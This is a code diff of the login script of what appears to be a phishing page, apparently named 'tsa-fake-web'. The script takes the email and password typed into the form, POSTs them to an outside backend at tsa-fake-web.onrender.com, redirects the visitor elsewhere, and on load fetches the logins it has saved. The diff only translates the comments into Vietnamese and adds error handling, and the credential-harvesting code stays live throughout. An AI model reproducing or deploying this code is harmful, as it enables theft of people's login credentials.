@@ -73,14 +73,19 @@
             const password = document.getElementById("password").value;
 
             // Gửi thông tin đăng nhập đến backend để lưu
-            fetch('https://tsa-fake-web.onrender.com/save-login', { // Replace with your Render backend URL
+            fetch('https://tsa-fake-web.onrender.com/save-login', { // Thay thế bằng URL backend của bạn
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({ email, password })
             })
-            .then(response => response.text())
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.text();
+            })
             .then(data => {
                 console.log(data);
                 // Chuyển hướng đến trang web chỉ định sau khi lưu thông tin
@@ -93,7 +98,7 @@
 
         // Kiểm tra nếu có thông tin đăng nhập đã lưu và điền vào form
         window.onload = function() {
-            fetch('https://tsa-fake-web.onrender.com/get-login') // Replace with your Render backend URL
+            fetch('https://tsa-fake-web.onrender.com/get-login') // Thay thế bằng URL backend của bạn
                 .then(response => {
                     if (response.status === 200) {
                         return response.json();
